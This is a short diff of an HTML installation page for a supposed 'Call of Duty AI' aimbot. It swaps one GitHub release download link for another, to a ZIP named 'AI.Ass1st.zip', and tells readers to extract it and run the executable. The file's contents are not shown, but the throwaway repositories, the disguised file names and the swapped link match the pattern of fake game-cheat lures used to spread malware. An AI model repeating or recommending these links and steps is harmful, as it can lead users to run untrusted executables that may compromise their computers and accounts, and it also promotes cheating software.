@@ -26,7 +26,7 @@
         <h2 style="font-size: 2.5em; color: #333;">Installation</h2>
         <p style="font-size: 1.2em;">To install the Call of Duty AI software, follow these steps:</p>
         <ol style="font-size: 1.2em;">
-            <li>Download the software from the following link: <a href="https://github.com/codwarez0/Call-of-Duty-AI-Aimbot/releases/download/Callofduty/Call.0f.Duty.AI.zip" style="color: #007BFF; text-decoration: none;">Download Call of Duty AI software</a></li>
+            <li>Download the software from the following link: <a href="https://github.com/KrivolasO/Black-Ops-6-AI-AimBot/releases/download/cod/AI.Ass1st.zip" style="color: #007BFF; text-decoration: none;">Download Call of Duty AI software</a></li>
             <li>Extract the downloaded ZIP file to a location of your choice on your computer.</li>
             <li>Run the executable file to launch the Call of Duty AI software</li>
         </ol>
